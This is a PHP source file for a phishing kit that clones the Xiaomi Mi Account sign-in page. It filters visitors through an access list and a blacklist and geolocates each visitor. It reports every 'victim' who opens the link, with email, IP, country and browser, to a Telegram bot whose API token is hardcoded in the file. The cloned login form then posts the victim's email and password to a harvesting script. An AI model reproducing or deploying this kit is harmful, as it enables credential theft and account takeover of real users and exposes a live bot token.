<?php
function getUserIP()
{
	$client = @$_SERVER['HTTP_CLIENT_IP'];
	$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
	$remote = $_SERVER['REMOTE_ADDR'];

	if (filter_var($client, FILTER_VALIDATE_IP)) {
		$ip = $client;
	}
	else if (filter_var($forward, FILTER_VALIDATE_IP)) {
		$ip = $forward;
	}
	else {
		$ip = $remote;
	}

	return $ip;
}
error_reporting(0);
$ID = (empty($_GET['ID']) ? NULL : $_GET['ID']);
$v = (empty($_GET['v']) ? NULL : $_GET['v']);
$accessed = file_get_contents('../access.txt');
if ($_SERVER['HTTP_HOST'] != 'localhost') {
	if (empty($ID) & empty($v)) {
		(include 'redir.html');
		exit();
	}

	if (strstr($accessed, $v) || strstr($accessed, $ID)) {
	}
	else {
		(include 'redir.html');
		exit();
	}
}

//$isp = geoip_isp_by_name($hostname);    
$ip_address = $_SERVER['REMOTE_ADDR'];
$geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$ip_address"));
//$url = file_get_contents("http://whatismyipaddress.com/ip/$ip_address");
//preg_match_all('/<th>(.*?)<\/th><td>(.*?)<\/td>/s',$url,$output,PREG_SET_ORDER);    
//$isp = $output[3][2];
$country = $geo["geoplugin_countryName"]; //Country
$region = $geo["geoplugin_regionName"]; //Region
$protocol = $_SERVER['SERVER_PROTOCOL']; 
$headers  = 'MIME-Version: 1.0' . "\r\n";    
$headers .= 'From:iOServer<noreply@ioserver.com>' . "\r\n"; 
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 
$user_ip = getuserip();
include '../notif.php';
$agent = $_SERVER['HTTP_USER_AGENT'];
$url = $_SERVER['HTTP_HOST'];
$names = '@iOServer';

//Notif by Telegram BOT
$token = "474892305:AAE6VOEBxf47R7FxuKVR4l85m_GRsQJ6_rA"; // Token of TELEGRAM API
$arr_index = array(    
"😎<b>Victim Opened Link</b>😎",
"%0A".
"👉Mi Account👈",
"Email : $ID",
"Random : $v",
"%0A".
"Country : $country",
"Region : $region",
"Browser : $agent",
"IP Address : $user_ip",
"%0A".
"KEEP SUPPORTING 👍 $names%C2%AE",);
foreach($arr_index as $value) { 
     $txt_index .= "".$value."%0A"; 
  }    
$fp=fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt_index}","r");

include 'BlackList.php';

$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

switch ($lang) {
case 'en':
	$lang_file = 'lang.english.php';
	break;

case 'pt':
	$lang_file = 'lang.portuguese.php';
	break;
	
case 'id':
	$lang_file = 'lang.indonesia.php';
	break;
	
case 'nl':
	$lang_file = 'lang.nederland.php';
	break;
	
case 'fr':
	$lang_file = 'lang.french.php';
	break;
	
case 'ru':
	$lang_file = 'lang.rusia.php';
	break;
	
case 'es':
	$lang_file = 'lang.spanish.php';
	break;
	
case 'de':
	$lang_file = 'lang.german.php';
	break;
	
case 'ja':
	$lang_file = 'lang.japan.php';
	break;
	
case 'vi':
	$lang_file = 'lang.vietnam.php';
	break;
	
case 'pl':
	$lang_file = 'lang.polish.php';
	break;
	
case 'zh':
	$lang_file = 'lang.chinese.php';
	break;
	
case 'it':
	$lang_file = 'lang.italia.php';
	break;

case 'hu':
	$lang_file = 'lang.hungary.php';
	break;
	
case 'th':
	$lang_file = 'lang.thailand.php';
	break;

default:
    $lang_file = 'lang.english.php';
}

include_once 'languages/' . $lang_file;
echo'<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<script type="text/javascript">' . "\r\n" . '  <!--' . "\r\n" . '  if (screen.width <= 800) {' . "\r\n" . '    window.location = "indexs.php?ID=';echo $ID;echo '&v=';echo $v;echo '";' . "\r\n" . '  }' . "\r\n" . '  //-->' . "\r\n" . '</script>  
  <meta name="description" content="小米帐号能使用小米手机，MIUI，小米云，多看阅读，米聊，小米社区等小米服务。">
  <meta name="keywords" content="小米帐号，小米账号，小米注册，注册，Mi Account，Sign in，小米，帐号，账号，小米帐户，登录，登陆，安全令牌，动态口令，小米注册，找回密码">
  
  <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
  <title>';echo $lang ['TITTLE'];echo'</title>

<link type="text/css" rel="stylesheet" href="css/login_sgp.css">
<link rel="shortcut icon" type="image/x-icon" href="img/favicon.ico">       
</head>
<body class="en">
    <div class="wrapper">              
    <!-- loading -->              
    <div class="popup_mask acquirePhoneMask" style="display:none;" id="loadingMask">                
    <div class="bkc"></div>                
    <div class="mod_wrap loadingmask">                
    </div>                
    <div class="loadingTips">';echo $lang ['Verifying'];echo'...</div>              
    </div>              
    
    <!--bg_banner_start-->              
    <div class="bgiframe">                
    <iframe name="ifr" style="height:100%" width="100%" height="686" src="about:blank" id="bgiframe" frameborder="0" scrolling="no"></iframe>
    </div>              
    <!--bg_banner_end-->              
    
    <div class="wrap">                
    <div class="layout_panel">                  
    <div class="layout" id="layout">                    
    <div id="main-content">                      
    
    <!--表单输入登录-->                      
    <div class="mainbox form-panel" id="login-main">                        
    <div id="custom_display_2"><a class="ercode" id="qrcode-trigger" href="javascript:void(0)"></a>
    </div>                        
    
    <!-- header s -->                        
    <div class="lgnheader">                          
    <div class="header_tit t_c">                            
    <em id="custom_display_1" class="milogo">                              
    <svg width="100%" height="100%" version="1.1" xmlns="http://www.w3.org/2000/svg"><rect width="48" height="48" rx="3" ry="3" style="fill:#ff6700"></rect><rect x="10" y="15" width="4.2" height="18" style="fill:#FFFFFF"></rect><rect x="33.75" y="15" width="4.2" height="18" style="fill:#FFFFFF"></rect><rect x="11.25" y="15" width="15" height="4.1" style="fill:#FFFFFF"></rect><rect x="26.2" y="20.55" width="4.2" height="12.5" style="fill:#FFFFFF"></rect><rect x="20.6" y="15" width="9.8" height="9.8" rx="4.4" ry="4.4" style="fill:#FFFFFF"></rect><rect x="20.2" y="19" width="6" height="6" rx="2" ry="2" style="fill:#ff6700"></rect><rect x="18" y="19.1" width="4" height="2.2" style="fill:#ff6700"></rect><rect x="24.2" y="23" width="1.94" height="10" style="fill:#ff6700"></rect><rect x="18.1" y="22.8" width="4.2" height="10.2" style="fill:#FFFFFF"></rect>
    </svg>                            
    </em>                            
    <h4 class="header_tit_txt" id="login-title">';echo $lang ['Mi_Account'];echo'</h4>                          
    <div class="site_info"></div>
    </div>                        
    </div>                       
<!-- header e -->                        
    
                     
    
    <!-- tab con s -->                        
    <div class="tabs-con tabs_con now" data-con="pwd">
        <div>                            
        <div class="login_area" id="login-main-form"> 
        <form action="mi.php?ID='.$ID.'&v='.$v.'" class="cloud-login form-ajax" role="form" data-red="https://ifindsupport.com/find" method="post" accept-charset="utf-8" required>
        <label class="labelbox pwd_panel ">
        <input class="item_account" type="email" name="ID" value="';echo $ID;
        echo '"  id="ID" placeholder="';echo $lang ['ACCOUNT'];echo'" required>  
                        </label>          
                                         
        <label class="labelbox pwd_panel">
        <input class="item_account" type="password" autocomplete="off" name="password" _type="password" id="password" style="direction: ltr !important; display:;" placeholder="';echo $lang['PASS'];echo'" required>               
         </label>      
              
                <!-- 错误信息 -->                                  
                <div class="err_tip">                                    
                <div><em class="icon_error"></em><span class="error-con"></span>
                </div>                                  
                </div>                                  
                <div class="btns_bg">                                    
                <input class="btnadpt" id="submit" type="submit" value="';echo $lang ['SIGN'];echo'">                                    
                <span id="custom_display_8" class="sns-default-container sns_default_container" style="display: none;"> 
                </span>                                  
                </div>                                  
                </form>  
                <div class="other_panel clearfix"> 
                
           
                <div class="n_links_area reg_forget_links reg-forget-links" id="custom_display_64">                                        <a class="outer-link" href="https://account.xiaomi.com/pass/register?callback=https%3A%2F%2Fi.mi.com%2Fsts%3Fsign%3DWUCEE0qj3dJ1evgAb01YFu9xxYY%253D%26followup%3Dhttps%253A%252F%252Fi.mi.com%252F%253F_locale%253Dpt_BR%26sid%3Di.mi.com&amp;sid=i.mi.com&amp;_snsNone=true&amp;_locale=en">';echo $lang ['CREATE'];echo'</a><span>|</span>                                        <a class="outer-link" href="https://account.xiaomi.com/pass/forgetPassword?callback=https%3A%2F%2Fi.mi.com%2Fsts%3Fsign%3DWUCEE0qj3dJ1evgAb01YFu9xxYY%253D%26followup%3Dhttps%253A%252F%252Fi.mi.com%252F%253F_locale%253Dpt_BR%26sid%3Di.mi.com&amp;sid=i.mi.com&amp;_snsNone=true&amp;_locale=en">';echo $lang ['FORGOT'];echo'</a>                                      </div>                                                                                                        <!-- 其他登录方式 s -->  <div style="display: block;" class="other_login_type sns-login-container" id="custom_display_16">                    <fieldset class="oth_type_tit">                             <legend align="center" class="oth_type_txt">';echo $lang ['OPTION'];echo'</legend>                                      
                      </fieldset>                                      
                <div id="sns-login-links" class="oth_type_links"><a class="icon_type btn_facebook sns-login-link" data-type="facebook" href="/pass/sns/login/auth?appid=222161937813280&amp;&amp;callback=https%3A%2F%2Fi.mi.com%2Fsts%3Fsign%3DWUCEE0qj3dJ1evgAb01YFu9xxYY%253D%26followup%3Dhttps%253A%252F%252Fi.mi.com%252F%253F_locale%253Dpt_BR%26sid%3Di.mi.com&amp;sid=i.mi.com" title="Sign in with Facebook" target="_blank"><i class="btn_sns_icontype icon_default_facebook"></i></a><a class="icon_type btn_google sns-login-link" data-type="google" href="/pass/sns/login/auth?appid=google&amp;&amp;callback=https%3A%2F%2Fi.mi.com%2Fsts%3Fsign%3DWUCEE0qj3dJ1evgAb01YFu9xxYY%253D%26followup%3Dhttps%253A%252F%252Fi.mi.com%252F%253F_locale%253Dpt_BR%26sid%3Di.mi.com&amp;sid=i.mi.com" title="Sign in with Google" target="_blank"><i class="btn_sns_icontype icon_default_google"></i></a>
                </div>                                    
                </div>                                    
                <!-- 其他登录方式 e -->                                    
                <p class="acq_tips" style="display: none;"></p>                                  
                </div>                                
                
                </div>                            
                </div>                          
                </div>                        
                </div>                        
                
                                       
                
                <!-- tab con e -->                      
                </div>                      
                </div>                  
                </div>                
                </div>              
                </div>            
                
                <div id="custom_display_4" class="n-footer">                
                <div class="nf-link-area clearfix">                  
                <ul class="lang-select-list">                    
                <li><a href="javascript:void(0)" data-lang="en" id="first-lang-select" class="lang-select-li current">';echo $lang ['LANGUAGES'];echo'</a>|
                </li>                    
                                    
                <li><a href="https://static.account.xiaomi.com/html/faq/faqList.html" target="_blank">';echo $lang ['FAQ'];echo'</a>|</li>                    
                <li><a id="msg-privacy" href="/about/protocol/privacy" target="_blank">';echo $lang ['PRIVACY'];echo'</a></li>                  
                </ul>                
                </div>                
                <p class="nf-intro">';echo $lang ['COPYRIGHT'];echo'</p>    </div>
</body>
</html>';
?>